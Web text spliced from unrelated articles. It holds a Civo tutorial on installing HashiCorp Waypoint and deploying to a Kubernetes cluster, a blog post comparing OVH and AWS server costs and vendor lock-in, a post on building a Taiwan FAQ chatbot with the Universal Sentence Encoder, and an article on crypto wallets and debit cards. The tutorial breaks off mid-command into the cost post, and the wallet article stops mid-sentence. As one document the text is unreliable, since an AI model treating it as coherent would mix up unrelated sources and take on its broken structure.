<p>Waypoint comes with logs and exec tools that helps you check if there are any issues with the proposed deployment. It is highly pluggable and extensible: in the image below below you can see some of the existing plugins for Docker and Kubernetes that are there by default - and the community can create and contribute more plugins.</p>

<p><img src="https://civo-com-assets.ams3.digitaloceanspaces.com/content_images/950.blog.png?1602826943" alt="Waypoint Plugins"></p>

<p>So, based on the plugins and with minimal configuration, Waypoint lets you build, deploy and release applications across platforms, saving you the hassle of having to write more lines of configuration files in different languages for different platforms.
Here are some of the resources to get you started - 
<a href="https://www.waypointproject.io/docs">Docs</a> 
<a href="https://github.com/hashicorp/waypoint/">Github</a></p>

<p>In this post I will show you how you can install and use Waypoint to build, deploy and release a sample application to a Civo Kubernetes cluster. If you have not yet signed up, you can <a href="https://www.civo.com/kube100">do so here</a> - you'll get $70 a month credit while the service is in beta.</p>

  Deploying a cluster
</h3>


<p>First, let's create a Civo cluster. It's easiest using the Civo <a href="https://github.com/civo/cli#set-up">CLI tool</a>, but you can also use the Kubernetes web UI in your Civo account to create it.</p>

<p>Download civo cli from <a href="https://github.com/civo/cli#set-up">here</a> </p>

<p>Configure to use by providing your API key, which you will find <a href="https://www.civo.com/account/security">here</a>.</p>

<p>Create cluster using the below command:</p>

<pre><code>civo k3s create --wait --save                           
The cluster polished-tree (6c8d2b30-496a-46d0-91bf-22124fc14f21) has been created in 2 min 53 sec
</code></pre>

<h3 id="installing-waypoint-onto-our-machine">

  Installing Waypoint onto our machine
</h3>


<p>You can download and install Waypoint on any platform. from your local machine to a virtual machine in the cloud. This example shows Waypoint installation on a CentOS7 box running on Civo. </p>

<p>Installing git, docker, and kubectl. Make sure you have downloaded the cluster configuration in the previous step to ~/.kube/config (if you used the command-line tool above, it will be saved in the correct place).</p>

<pre><code>yum install git -y

yum install docker -y
systemctl start docker 

curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl 
mv kubectl /usr/local/bin/

#Check if cluster is runnning 
kubectl get nodes
NAME               STATUS     ROLES    AGE     VERSION
kube-node-1c23     Ready      &lt;none&gt;   110s    v1.18.6+k3s1
kube-node-3e04     Ready      &lt;none&gt;   110s    v1.18.6+k3s1
kube-master-5fdc   Ready      master   3m52s   v1.18.6+k3s1
</code></pre>

<p>Install and configure Waypoint for a sample repository:</p>

<pre><code>
sudo yum install -y yum-utils
sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo
sudo yum -y install waypoint

git clone https://github.com/saiyam1814/waypoint-demo.git
cd waypoint-demo

waypoint install --platform=kubernetes -accept-tos
service/waypoint created
statefulset.apps/waypoint-server created
Waypoint server successfully installed and configured!

The CLI has been configured to connect to the server automatically. This
connection information is saved in the CLI context named "install-1602830444".
Use the "waypoint context" CLI to manage CLI contexts.

The server has been configured to advertise the following address for
entrypoint communications. This must be a reachable address for all your
deployments. If this is incorrect, manually set it using the CLI command
"waypoint server config-set".

Advertise Address: 91.211.154.49:9701
HTTP UI Address: 91.211.154.49:9702

  Deploying our application
</h3>


<p>Now that we have Wavpoint installed, let's initiate if for the application that is to be installed. </p>

<pre><code> waypoint init
Initial Waypoint configuration created!
No Waypoint configuration was found in this directory.

A sample configuration has been created in the file "waypoint.hcl". This
file is heavily commented to help you get started.

Once you've setup your initial configuration, run "waypoint init" again to
validate the configuration and initialize your project.
</code></pre>

<p>This creates a waypoint.hcl file with basic structure that needs to be configured as per the application. Now for our current example project, there is already a waypoint.hcl present in <code>waypoint-demo</code>directory</p>

<pre><code>project = "saiyam-waypoint"

app "saiyam-waypoint" {
  labels = {
      "service" = "saiyam-waypoint",
      "env" = "dev"
  }

  build {
   use "docker" {}
    registry {
        use "docker" {
          image = "saiyam911/cd-demo"
          tag = "1"
  }
    }
 }

  deploy { 
    use "kubernetes" {
        probe_path = "/"
        service_port = 8080
}
  }

  release {
    use "kubernetes" {
      node_port = 31769
      port = 8080
    }
  }
}
</code></pre>

<p>Let's run waypoint init </p>

<pre><code>waypoint init
âœ“ Configuration file appears valid
âœ“ Connection to Waypoint server was successful
âœ“ Project "example-nodejs" and all apps are registered with the server.
âœ“ Plugins loaded and configured successfully
âœ“ Authentication requirements appear satisfied.

Project initialized!

You may now call 'waypoint up' to deploy your project or
commands such as 'waypoint build' to perform steps individually.
</code></pre>

<p>Three main steps to notice here are build, deploy and release that have to be created and configured in order to install the application onto the cluster. You can also do customizations like provide the kubeconfig file etc. by checking the <a href="https://www.waypointproject.io/plugins">plugins documentation</a>.</p>

<p>To run all these steps, there is a simple command:</p>

<pre><code>waypoint up

        <p>Published on: 2020-11-02</p>
        
<p><em>Note: Some details of the stories in this article are slightly altered to protect the privacy of the companies I worked for</em></p>
<p>It's somewhat anecdotal, but in my work, I often encounter projects that seem to use highly inefficient infrastructure providers, from a cost perspective.</p>
<p>I usually point out that, based on a fairly unbiased hardware comparison, that they could save over half their budget by migrating, and am usually met with a series of almost canned answer about migrations being too difficult due to x,y,z.</p>
<h2>I - A representative comparison</h2>
<p>I will pick one of the "expensive" and one of the "cheap" server providers, chosen simply based on the fact that I've worked with them a lot, and compare two of their high~ish end servers.</p>
<p>I'm going to take 1 example from a cheap server provider OVH and a somewhat worst machine from AWS.</p>
<p>OVH offers <a href="https://us.ovh.com/us/order/dedicated/#/dedicated/configure-hg?product=~(dc~(gra~1)~planCode~%271901bhg~option~(~(planCode~%27cpu-2x6132-dual-2018v1~family~%27cpu~quantity~1)~(planCode~%27ram-768g-2666-dual-2018v1~family~%27ram~quantity~1)~(planCode~%27disk-960ssd-sata-2019~family~%27disk~quantity~8)))">this machine</a>:</p>
<ul>
<li>2x Intel Xeon Scalable Gold 6132 - 28c/56t - 2.6/3.7 GHz</li>
<li>768GB RAM DDR4 ECC 2666MHz</li>
<li>960GB SATA SSD</li>
<li>3 Gb/s internal and 1 Gb/s external free bandwidth</li>
</ul>
<p>For $15,800/year (though it can be paid monthly)</p>
<p>For a close comparison, AWS offers their <a href="https://aws.amazon.com/ec2/pricing/on-demand/">4.16xlarge</a>. I'll try to figure out the exact hardware specs on <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/memory-optimized-instances.html">this description</a>:</p>
<blockquote>
<p>R4 instances feature up to 64 vCPUs and are powered by two AWS-customized Intel XEON processors based on E5-2686v4 that feature high-memory bandwidth and larger L3 caches to boost the performance of in-memory applications.</p>
</blockquote>
<p>So basically let's call it 2x E5-2686v4, though the "real" E5-2686v4 seems to have more cores (both real and virtual) than the AWS version, I'll give AWS the benefit of the doubt and say that their version is more or less the same. I'll also assume AWS's RAM is the same 2666MHz DDR4 EEC2 (basically the best you can get right now) though they don't specify this, but I'll be generous here.</p>
<p>So we have:</p>
<ul>
<li>2x Intel Xeon E5-2686v4 - 36c/72t - 2.3/3.0 GHz</li>
<li>488GB RAM DDR4 ECC 2666MHz</li>
<li>Storage paid for separately</li>
<li>Bandwith paid for separately</li>
</ul>
<p>For $37,282/year (paid hourly) or $25,771/year (paid upfront)</p>
<p>The OVH server has more memory, it comes with 1TB of very fast storage, and adding more storage is much cheaper than AWS EBS prices (+ you get the option for NVME SSDs connected via PCIe on all servers).</p>
<p>I chose two processors which are <em>fairly</em> similar but running a comparison is still hard. Unlike e.g. RAM, processors are much more synergistic, you can't just look at parameters like nr cores, cache size, and frequency to figure out how well they perform.</p>
<p>Still, these two seem to be pretty close on those parameters and when looking at <a href="https://www.cpubenchmark.net/compare/Intel-Xeon-E5-2686-v4-vs-Intel-Xeon-Gold-6132/2870vs3227">the benchmarks</a>. It seems that the Gold 6132 is marginally better than the E5-2684-v4. Granted, benchmarking server CPUs is hard, but still, I think it's fair to say that the former has at least a tiny advantage, even if somehow the E5-2684 performs worst of benchmarks than on "real tasks".</p>
<p>So we have 2 servers:</p>
<ul>
<li>Both are in Paris</li>
<li>One has 768GB of RAM the other 488GB (58% of the first one) with the same specs</li>
<li>One has an extremely to slightly better CPU (let's say 10% better, a bit bellow the ~17% claimed by the benchmarks)</li>
<li>One has free bandwidth, the other one charges you for every single Kb of communication with the outside world (though at a fairly small sum)</li>
<li>One comes with 1TB of very fast NVME storage, for the other one you have to pay extra</li>
<li>One is paid monthly, the other one yearly or hourly.</li>
</ul>
<p>If the first server, the one that is better in literally every way, costs ~16k/year... how much should the other one cost? Well, maybe 10, maybe 12, maybe 14?</p>
<p>I don't know, but the answer certainly shouldn't be "Almost twice as much at 26k/year", that's the kind of answer that indicates something is broken.</p>
<p>In a worst-case scenario, AWS is ~1.6x times as expensive, but again, that's paid yearly. If we compare paid monthly to paid hourly (not exactly fair) we get 37k vs 16k, if we do some <a href="https://aws.amazon.com/ebs/pricing/">napkin math calculations</a> for equivalent storage cost (with equivalent speed via guaranteed iops) we easily get to ~3k/year extra. We have a 40k vs 16k difference, the AWS machine with the worst specs is 250% more expensive.</p>
<p>But whether the worst AWS machine is 160% or 250% as expensive as the OVH one is not the relevant question here, the question is why are we seeing those astronomical differences in terms of cost to being with.</p>
<p>We should consider there are hosting providers cheaper than OVH (e.g. scaleway, potentially online.net, and other such providers you never heard of). On the flip side of the coin, there are server providers such as digital oceans, GC, and Azure that can be more expensive than AWS.</p>
<p>Why?</p>
<h2>II - Vendor lock-in hypothesis</h2>
<p>The easiest thing to do here is to cry vendor lock-in.</p>
<p>The story goes that you end up using firebase for authentication, then you hire a sysadmin / DevOps guy that knows GC to create your infrastructure there. Then you make use of some fancy google ML service that integrates seamlessly with the GC storage... so on and so forth, until it would cost you a lot more manpower to move away from GC than to pay them a bit extra for whatever compute or storage you could get for less elsewhere.</p>

<p>This is compounded by the fact that most of the time startups are oblivious to the cost of these services.</p>
<p>I switched my personal "infrastructure" from AWS since it ended up costing me over $100/month to maintain. Nowadays I pay $23/month and get a lot more leeway out of my current setup. But I haven't done that with some startups I've worked with or advised, even though the cost savings could have one or two additional zeros added to them. Why?</p>
<p>I can often call the shots regarding hardware at the startups I've worked with, yet I usually can't argue against using AWS or GC... because often enough, the first hit is free. AWS, GC, and Azure are throwing out 10k$ worth of credits like candy, and topping that off with 50-200k$ worth of credit for startups that they think have potential. The catch here is that the credits expire in 1 year, and once that year is done many are probably locked into the vendor.</p>
<p>The startup model is one of exponential growth, most fail and the winners have dozens or hundreds of millions from investments. So what is one or two hundred thousand a year on an IaaS bill?</p>
<p>Well, the answer is almost nothing. I believe the standard AWS offering for free credits is something like 100k$/year. So assuming a startup that uses that for a year gets 10mil in investment, it costs them 1% of their budget a year to maintain that.</p>
<p>The problem is that investment reflects future potential worth, a startup receiving a 10 mil investment is probably operating at a small fraction of the capacity those investors hope it will reach. For the shares to be worth 5x time that original investment, the company might have to scale its operations 20x or 50x, or 100x.</p>
<p>This becomes a problem since you can't run on investment forever, and scaling up 20x suddenly turns that 100k into 2 million a year spent on servers.</p>
<p>Of course, this is just a hypothetical, the numbers here are stand-ins to make a point, not a case-study. From my own experience, that the lock-in funnel looks something like:</p>
<ol>
<li>Free credits, let's use {expensive infrastructure provider}.</li>
<li>Loads of investment money, let's not waste time switching away from {expensive infrastructure provider}, it's &lt; 1% of our yearly budget.</li>
<li>Turns out that once the company grew, {expensive infrastructure provider} now consists of a double-digit percentage of our yearly expenditure, but it's too late to switch now.</li>
</ol>
<hr>
<p>This situation is exacerbated by consolidation (big fish buys little fish). I vividly remember a situation where I found an optimal hardware+software combination for a data processing platform, I think a conservative estimate would be that it was ~5 times cheaper than the vendor lock-in alternative being used at the time.</p>
<p>This happened to make it worth the switch since the startup lacked a generous credit offer for Google cloud. But, as soon as it was "consolidated", I was forced to switch the whole system back to Google cloud, granted a much better GC setup, but one that still involved costs ~2-3x times greater than the original solution.</p>
<p>Why? Well, boils down to the parent company using Google cloud, all their employees knowing how to work with GC, all their contracts having weird security-related clauses composed by many lawyers based on "official security audits" ran on their GC infrastructure, and so on.</p>
<p>However, this leads nicely into my second hypothesis.</p>
<h2>III - Employee lock-in hypothesis</h2>
<p>Employees end up deciding most of what a company is using internally, including infrastructure providers.</p>
<p>People aggregate <a href="https://slatestarcodex.com/2014/09/30/i-can-tolerate-anything-except-the-outgroup/">along weird lines</a>, to the extent that it wouldn't surprise me if a CTO hired initial engineers that favored his preferred infrastructure provider, even if he didn't actively seek that trait out.</p>
<p>Once the first few employees are fans of a given infrastructure provider, it starts making it into the job specs, because onboarding someone familiar with AWS when you use Azure is a huge pain in the ass. All other things being equal you'd rather have someone familiar with the technology you are already using.</p>
<p>This is compounded by the kind of employees that permeate a given field. If you are developing mobile apps or web apps, for example, it's likely that many engineers you will find will be familiar with Heroku and Digital Oceans. If you are developing whatever the heck people use C# for, I'd bet you'll find people that know how to use Azure. If you are doing machine learning, most people will know a thing or two about google cloud's offers regarding TPUs.</p>
<p>More broadly, this leaves no room for people that want to have a "multi-cloud" infrastructure or use a very little known platform. Either you get engineers that are very versed in the subject, but that will cost extra. Or you consign to having a few experts on the subject handle everything, with the rest of the team having no idea how to boot up a new VM without calling someone up.</p>

    <p><img src="https://jonathanbgn.com/assets/images/taipei.jpg" alt="Taipei"></p>

<p>Currently living in Taiwan, I recently joined the <a href="https://github.com/taiwangoldcard/taiwan-bot">Taiwan Bot 🤖</a> project along with <a href="https://www.linkedin.com/in/shawn-lim-0a307550">Shawn</a> and <a href="https://erickhun.com/about/">Eric</a>. The idea is to build a go-to assistant to help foreigners answer their questions about moving to, working, and living in Taiwan (pro-tip: ask the bot where to find cheese or chocolate).</p>

<p>Building a functional and useful chatbot is a non-trivial project. Fortunately, there has been impressive progress in the fields of machine learning and <strong>natural language processing (NLP)</strong> in the past few years. Moreover, the democratization and open-source sharing of cutting-edge deep learning models from research work at large tech companies like Google or Facebook is making it possible for anyone to implement the latest state-of-the-art solutions.</p>

<p>The <a href="https://ai.googleblog.com/2018/05/advances-in-semantic-textual-similarity.html">Universal Sentence Encoder</a>, recently released by Google AI, is one of these new models available via <a href="https://tfhub.dev/google/universal-sentence-encoder/4">Tensorflow Hub</a>. Trained in a <strong>multi-tasking</strong> fashion, the model can encode sentences into meaningful continuous representations that work well on a range of different tasks. It is thus ideal for <strong>transfer learning</strong> and performs competitively with more complex models like <a href="https://en.wikipedia.org/wiki/BERT_(language_model)">BERT</a>. Moreover, it can run much faster than BERT or other similar <a href="https://en.wikipedia.org/wiki/Transformer_(machine_learning_model)">Transformer</a> models and is thus more applicable to real-world problems. There is even a <a href="https://tfhub.dev/google/universal-sentence-encoder-lite/2">Lite version</a> of the model, small enough to run in Javascript on the client-side.</p>

<h2 id="the-project">The project</h2>

<p>Despite being an amazing place to live, <strong>Taiwan is still misunderstood by most foreigners</strong>. We think that a fun and approachable chatbot could help people understand a lot more about all the great things this place has to offer, as well as answer most of the questions they might have about living here.</p>

<p>We decided to start with a limited scope first and to focus on answering practical questions about moving to and living in Taiwan. Specifically, we chose to focus on visa issues and the recently created <a href="https://taiwangoldcard.com/">Gold Card program</a>. We plan to expand the bot capabilities in future versions.</p>

<p>When it comes to chatbots, there are a lot of ways to go, and many tools and libraries out there to help you make your plan a reality. However, being just a small team of 3 doing this in our spare time, we didn’t have enough resources and time to build something very sophisticated. We also didn’t want to spend a lot of time to compile a large training dataset. So we looked for the best way to build a system that would be:</p>

<ul>
  <li>🧩 Easy and quick to build</li>
  <li>⚡️ Lightweight and runnable on a small server</li>
  <li>🔧 Iterable and easy to improve</li>
  <li>🧠 Focused on finding relevant answers</li>
</ul>

<p>We chose to build our bot with Microsoft’s <a href="https://github.com/microsoft/botframework-sdk">Bot Framework SDK</a> for easy development, user management and to be able to easily publish it to multiple platforms like Messenger or Line, the most popular messaging platform in Taiwan. <strong>The only thing remaining was to build the brain behind the messages.</strong></p>

<h2 id="understanding-the-meaning-behind-a-question">Understanding the meaning behind a question</h2>

<p>The main challenge when building a bot is <strong>relevancy</strong>, and this starts by having a clear understanding of what the user’s intention is. There are many approaches possible to make sense of what the user wants. At the most simple, one could simply look for some keywords such as <code>hello</code>, <code>restaurant</code>, or <code>visa</code>. However, this doesn’t take at all into account all the nuances of the language.</p>

<p>We didn’t have the resources to build a full-scale bot that could recognize the user intention among thousands of possibilities, yet we wanted to create something that could be relevant enough so that people would find it useful. So we needed to find an ideal middle ground between complexity and performance.</p>

<p>One of the most important concepts in NLP is one of <strong>distributed representations</strong>, inspired by the linguistic field of <a href="https://en.wikipedia.org/wiki/Distributional_semantics">distributional semantics</a>. The core idea is to encode linguistic items (words, sentences) into <strong>embeddings</strong> (vectors in a large dimensional space) such that items with similar properties should be closer in the resulting space.</p>

<blockquote>
  <p>You shall know a word by the company it keeps.</p>

  <p><em>- John Rupert Firth (1957)</em></p>
</blockquote>

<p>For example, similar words will cluster together in the vector space:</p>

<p><img src="https://jonathanbgn.com/assets/images/word-embeddings.png" alt="Word Embeddings"></p>

<p><em>Image from <a href="https://blog.tensorflow.org/2020/08/introducing-semantic-reactor-explore-nlp-sheets.html">TensorFlow Blog</a></em></p>

<p>You could do the same as the above but with sentences, effectively encoding them into large vectors which can be compared between themselves using <strong>similarity functions</strong>. Hence sentences with similar vector representations are sentences with similar meaning, topic, syntax…</p>

<h2 id="encoding-questions-with-the-universal-sentence-encoder">Encoding questions with the Universal Sentence Encoder</h2>

<p>The <a href="https://arxiv.org/abs/1803.11175">Universal Sentence Encoder</a> is a powerful Transformer model (in its large version) allowing to extract <a href="https://developers.google.com/machine-learning/crash-course/embeddings/video-lecture">embeddings</a> directly from sentences instead of from individual words. It already powers some impressive Google projects such as <a href="https://books.google.com/talktobooks/">Talk to Books</a> or <a href="https://google.github.io/mysteryofthreebots/">Mystery of the Three Bots</a>.</p>

<p>For our chatbot project, we are first using the model to encode all the questions that we think users would want to ask to the bot. This can be done in a few lines of code thanks to the convenient TensorFlow Hub library:</p>

<div><div><pre><code><span>import</span> <span>tensorflow</span> <span>as</span> <span>tf</span>
<span>import</span> <span>tensorflow_hub</span> <span>as</span> <span>tfhub</span>

<span>model</span> <span>=</span> <span>tfhub</span><span>.</span><span>load</span><span>(</span><span>"https://tfhub.dev/google/universal-sentence-encoder/4"</span><span>)</span>

<span>questions</span> <span>=</span> <span>[</span> <span>...</span> <span>]</span>  <span># questions most likely to be asked to the bot
</span><span>answers</span> <span>=</span> <span>[</span> <span>....</span> <span>]</span>  <span># all answers to the questions above
</span>
<span>batch_size</span> <span>=</span> <span>10</span>
<span>embeddings</span> <span>=</span> <span>[]</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> <span>len</span><span>(</span><span>questions</span><span>),</span> <span>batch_size</span><span>):</span>
    <span>embeddings</span><span>.</span><span>append</span><span>(</span><span>model</span><span>(</span><span>questions</span><span>[</span><span>i</span><span>:</span><span>i</span><span>+</span><span>batch_size</span><span>]))</span>
<span>questions_embeddings</span> <span>=</span> <span>tf</span><span>.</span><span>concat</span><span>(</span><span>embeddings</span><span>,</span> <span>axis</span><span>=</span><span>0</span><span>)</span>
</code></pre></div></div>

<p>Then whenever a user asks a question, we can just extract its embedding and find the most similar question in our database of embeddings. In our case we use a simple vector dot product as a similary function:</p>

<div><div><pre><code><span>def</span> <span>find_best_answer</span><span>(</span><span>question</span><span>:</span> <span>str</span><span>)</span> <span>-&gt;</span> <span>str</span><span>:</span>
    <span>embedding</span> <span>=</span> <span>model</span><span>([</span><span>question</span><span>,])</span>
    <span># compute dot product with each question:
</span>    <span>scores</span> <span>=</span> <span>questions_embeddings</span> <span>@</span> <span>tf</span><span>.</span><span>transpose</span><span>(</span><span>embedding</span><span>)</span>

    <span>return</span> <span>answers</span><span>[</span><span>np</span><span>.</span><span>argmax</span><span>(</span><span>tf</span><span>.</span><span>squeeze</span><span>(</span><span>scores</span><span>).</span><span>numpy</span><span>())]</span>
</code></pre></div></div>

<h2 id="google-sheets-as-a-collaborative-database">Google Sheets as a collaborative database</h2>

<p>We built our dataset using a simple Google spreadsheet with 2 columns: questions and answers. Whenever a user asks a question, we just find the most relevant question and return the appropriate answer.</p>

<p><img src="https://jonathanbgn.com/assets/images/taiwan-bot-database.png" alt="Questions Answers Dataset"></p>

<p>This approach, while relatively simple, is a flexible enough for efficiently working together. Querying the data is done once during startup with a few lines of code:</p>

<div><div><pre><code><span>client</span> <span>=</span> <span>gspread</span><span>.</span><span>authorize</span><span>(</span>
    <span>ServiceAccountCredentials</span><span>.</span><span>from_json_keyfile_dict</span><span>(</span><span>SERVICE_ACCOUNT_INFO_DICT</span><span>,</span>
        <span>[</span><span>'https://spreadsheets.google.com/feeds'</span><span>,</span><span>'https://www.googleapis.com/auth/drive'</span><span>])</span>
<span>)</span>
<span>sheet</span> <span>=</span> <span>client</span><span>.</span><span>open</span><span>(</span><span>SPREADSHEET_FAQ_FILE</span><span>).</span><span>worksheet</span><span>(</span><span>SPREADSHEET_SHEET_NAME</span><span>)</span>
<span>questions</span> <span>=</span> <span>list</span><span>(</span><span>map</span><span>(</span><span>str</span><span>.</span><span>strip</span><span>,</span> <span>sheet</span><span>.</span><span>col_values</span><span>(</span><span>1</span><span>)[</span><span>1</span><span>:]))</span>
<span>answers</span> <span>=</span> <span>list</span><span>(</span><span>map</span><span>(</span><span>str</span><span>.</span><span>strip</span><span>,</span> <span>sheet</span><span>.</span><span>col_values</span><span>(</span><span>2</span><span>)[</span><span>1</span><span>:]))</span>
</code></pre></div></div>

<p>Here is an example of a conversation with the bot:</p>

<p><img src="https://jonathanbgn.com/assets/images/taiwan-bot-conversation.jpg" alt="Conversation with the bot"></p>

<h2 id="continuous-improvement">Continuous improvement</h2>

<p>We did our best to think about what would be the most commonly asked questions but, of course, we cannot predict everything people will ask. This is why if you ask a question that is not present in our database, the bot can answer with something completely unrelated. To prevent this, we built a small logging system to be able to track the questions asked to the bot and which question it thought was the most similar (along with the similarity score).</p>

<p>For example, here is what happened behind the scenes during the small conversation above. The first column is the user message. The second column is the most similar question (as based on the embeddings similarity). The third column is the best answer and the last column the computed similarity score. If the similarity score is not good enough, the bot will answer with a generic reply <em>” Sorry, I cannot help with that yet “</em>.</p>

<p><img src="https://jonathanbgn.com/assets/images/taiwan-bot-logs.png" alt="Conversation Logs"></p>

<p>This logging system will also help us improve our answers as more people use the bot and new edge cases are found. Still, no chatbot is perfect, and we think the bot will be most useful in a context where humans can take over when the bot fails. For example, on Slack, we added the bot to a general FAQ channel where people can get assistance from both the bot and humans for more specific information.</p>

<p><img src="https://jonathanbgn.com/assets/images/taiwan-bot-slack.png" alt="Chatbot on Slack"></p>

<h2 id="conclusion">Conclusion</h2>

<p>Building an effective chatbot doesn’t have to be a complex project. As long as the scope is relatively narrow, it is possible to use a general encoder model like the Universal Sentence Encoder to build something useful. The hard part is collecting enough questions/answers for the bot to be able to answer most questions. It is also important to regularly monitor what users are asking and complement new data whenever the bot can’t find a relevant answer.</p>

					<!--kg-card-begin: markdown--><p>Already the Templars, in a certain respect the first bankers, provided pilgrims with receipts for their deposited valuables (compare: <a href="https://bigthink.com/philip-perry/did-the-knights-templar-invent-modern-banking">Big Think: "Did the Knights Templar invent modern banking?"</a>). This relates to Christian pilgrims in Jerusalem. The city had been captured by the first crusade in 1099 and pilgrims began to stream in, traveling thousands of miles across Europe.</p>
<p>Those pilgrims needed to somehow fund months of food and transport and accommodation, yet avoid carrying huge sums of cash around, because that would have made them a target for robbers. Pilgrims could leave their cash at Temple Church in London, and withdraw it in Jerusalem. Instead of carrying money, the pilgrim would carry a letter of credit. The Knights Templar were the <a href="https://www.investopedia.com/terms/f/forex.asp">Forex (FX)</a> of the crusades.</p>
<p>Even up to nowadays; if a user stores assets with a third party – like a bank – then they legally own the assets through some form of contractual agreement, and on the bank’s books, their assets are their liabilities – which represent an obligation on their end to pay the user back. Custodians actually only ensure the safe custody of the assets deposited with them and their transfer.</p>
<p><strong>Major banks have not remained inactive and have now adapted to the online world. But one thing has not changed for them: They still remain the owners of the users money. Non-Custodial (Crypto) Wallets assure that the user alone has control over their capital.</strong></p>
<p>It is important to point out that Crypto wallets come in two forms – <strong>custodial solutions</strong> where third parties such as exchanges have control over (crypto)currencies; and <strong>non-custodial</strong> solutions where you have full control over your (crypto)currencies or digital assets. Let us have a closer look on the different solutions along some examples in the market.</p>

<p>To use their services and card, the user needs to send crypto to the company’s fully decentralized, ERC-20-compliant smart contract wallet. <strong>The company has no access to the assets in the users wallet.</strong> The following crypto currencies are supported to top-up tokens to the Visa Debit Card: ETH, <a href="https://coinmarketcap.com/de/currencies/monolith/">TKN</a>, DAI, DGD, DGX, MKR, SAI, USDT.<br>
Additionally the wallet itself supports: ABT, ANT, AOA, BAT, BIX; BNT, BTU, BZ, C20, CCCX, CENNZ, CRPT, DAI, DENT, DGD, DGTX, DGX… and <a href="https://support.monolith.xyz/hc/en-us/articles/360002236637-What-tokens-are-available-on-the-wallet-">way more</a>.</p>
<p>Further services include:</p>
<ul>
<li><strong>Payment splitting:</strong> The user is able to divide the cost of an in-store purchase across several of their crypto holdings by using the associated app</li>
<li><strong>Coin exchange:</strong> Market rates (best rate available) due to <a href="https://medium.com/monolith/monolith-dex-the-defi-one-stop-shop-2ba1166197da">Monolith’s DEX aggregator</a>. The service also works with UniSwap, Kyber, Bancor, 0x, Mesh, and EtherDelta so far.</li>
<li><strong>Open-Source:</strong> The <a href="https://github.com/tokencard/contracts">smart contracts</a> for the tokencard are publicly available on <a href="https://github.com/tokencard/contracts">Github</a>.</li>
<li><strong>Fee charges:</strong> Monolith charges a 1% fee for loading up the debit card with crypto and a 1% “community contribution” fee (or “License Fee” when using their app) for each transaction, as a contribution to the open-source project.</li>
<li>However, Monolith <strong>offers a way to waive either one of the two fees</strong>. The first one is by using DAI to top up the card, in which case the 1% deposit fee is waived (but you’ll still have to pay the community contribution fee). DAI is a liquid stablecoin which you can easily buy on several exchanges. The second way is to use their <strong><a href="https://coinmarketcap.com/de/currencies/monolith/">TKN</a> token</strong> in which case you won’t pay the community contribution fee, but the 1% deposit fee will still apply.</li>
<li><strong>Project Community Chest:</strong> The community contribution fee is automatically deposited into the project’s community chest, which can be found on this <a href="https://etherscan.io/address/asset-contract.tokencard.eth">Ethereum address</a></li>
<li>further information in regards of the fees is available here: "<a href="https://storage.googleapis.com/monolith-public-documents/eur-fees.pdf">Fee Information Document</a>"</li>

<p><a href="https://plutus.it/">Plutus</a> is one of the longest running crypto card services, having <a href="https://www.crunchbase.com/organization/plutus">pitched up in 2015</a>. Their services are usable in almost 200 countries, the provided VISA debit card (KYC needed) can be topped up using GBP or EUR, with ETH and <a href="https://coinmarketcap.com/currencies/pluton/">PLU</a> the only supported cryptos at the current time. PLU is the startups own loyalty token which is awarded to users every time they use their debit card. A user can earn 3% crypto reward in <a href="https://coinmarketcap.com/currencies/pluton/">PLU</a> and up to 15% cash back at selected retailers (Nike, Vodafone, AirBnB, Skyscanner, etc.)</p>
<p>Once the user initiates a sell order on their decentralised exchange, the <a href="https://plutus.it/dex">PlutusDEX</a>, the order will be matched and the user will be prompted to send the funds to buyer using <a href="https://metamask.io/">Metamask</a>. This means that once you sell your cryptocurrency, the balance in GBP or EUR will be added to your account inside the app immediately. Of course, you also get the chance to confirm or deny the current market rate.</p>
<p>Plus offers three different plans that slightly differentiate when it comes to Limits and Fees.</p>

<p><a href="https://www.bitwala.com/de/">Bitwala</a> used to be one of the first platforms to offer both banking as well as a non-custodial crypto wallet and trading service. Bitwala’s investors include Earlybird, Sony Financial Ventures, coparion, Global Brain, High Tech Gründerfonds, ALSTIN Capital, and Digital Currency Group. The Berlin based company also offers a Mastercard debit card for in-store and online payments. Their offer is currently only available to EU residents and can be used to receive salary, bank transfers, standing orders, bank transfers to any bank within the EU. Therefore they secured up to €100.000 by German Deposit Guarantee Scheme.</p>
<p>Bitwala currently supports BTC and ETH and offers a "Bitwala Interest Account". The user can receive up to 5% interest on Bitcoin deposit. Their fees are actually low (e.g. EUR 0,00 for account opening &amp; management, SEPA Transactions, Card payment in € in SEPA area, ATM withdrawals in SEPA area). In regards of their Crypto Services Buying and Selling Cryptos takes 1% of the transaction volume + a network fee. A detailed pricelist can be found at their <a href="https://www.bitwala.com/static/bitwala-pricing-en-9f44a1fa19f8622a1e916146234f9c84.pdf">official website</a> (PDF).</p>

<p>Custodial wallets are usually software wallets or wallets in digital exchanges where private keys are held by a third party. Meaning, the third party has a full control over your funds while the user has to give permission to send or receive payments. As a side-effect one disadvantage could be that the digital exchange or service provider gets hacked and the private keys are stolen, which leads to the possibility of losing 100% of the users' assets. To detail this out a bit more; a closer look at the pros and cons:</p>
<h3 id="pros">Pros</h3>
<ul>
<li><strong>Free Transactions:</strong> Unlike regular wallets, custodial wallets do not demand a transaction fee. Which basically means customers can make transactions for free within the ecosystem.</li>
<li><strong>No Major Effect of Lost Private Keys:</strong> Even if the user loses their private keys, it would be relatively easy to regain access into their wallet and stored assets.</li>
<li><strong>Higher Backup Possibility:</strong> Another advantage of custodial wallets is that the central authority managing your wallet offers backup facilities. This makes it easier to undo any transaction or restore a previous version.</li>
</ul>
<h3 id="cons">Cons</h3>
<ul>
<li><strong>Custodian is in control of the asset:</strong> There is no autonomy for the user over their wallet. The third-party (custodian) has complete control over the assets and associated processes. As an example this could have limitations on the users' freedom including freezing the account or stored amount.</li>
<li><strong>Need for KYC:</strong> Performing a KYC (Know Your Customer, ID Verification) is crucial for Custodial Wallets. The user cannot gain access to their assets or any of the related services without proving their …</li></ul></div></div></article></div>

